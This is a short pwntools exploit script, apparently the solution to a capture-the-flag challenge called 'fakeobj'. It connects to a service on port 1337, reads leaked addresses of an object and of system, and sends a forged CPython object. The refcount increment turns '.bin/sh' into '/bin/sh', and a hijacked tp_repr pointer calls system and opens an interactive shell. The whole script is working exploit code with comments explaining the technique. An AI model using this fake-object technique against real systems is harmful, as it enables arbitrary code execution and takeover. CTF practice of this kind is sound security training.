from pwn import *

# conn = process(['python3', '../publish/fakeobj.py'])
conn = remote('0.0.0.0', 1337)

addrof_obj = int(conn.recvline().decode().split(' = ')[1], 16)
system = int(conn.recvline().decode().split(' = ')[1], 16)
log.success(f'addrof(obj) = {hex(addrof_obj)}')
log.success(f'system = {hex(system)}')

payload = flat([
    b'.bin/sh\x00', # ob_refcnt, will be refcnt inc'd then called as tp_repr arg
    p64(addrof_obj - 88 + 16), # set ob_type such that tp_repr points to obj+24
    p64(system), # tp_repr will point to this, so we call system("/bin/sh") !
], length=72, filler=b'\x00')
conn.sendlineafter('fakeobj: ', payload.hex().encode())

conn.interactive()
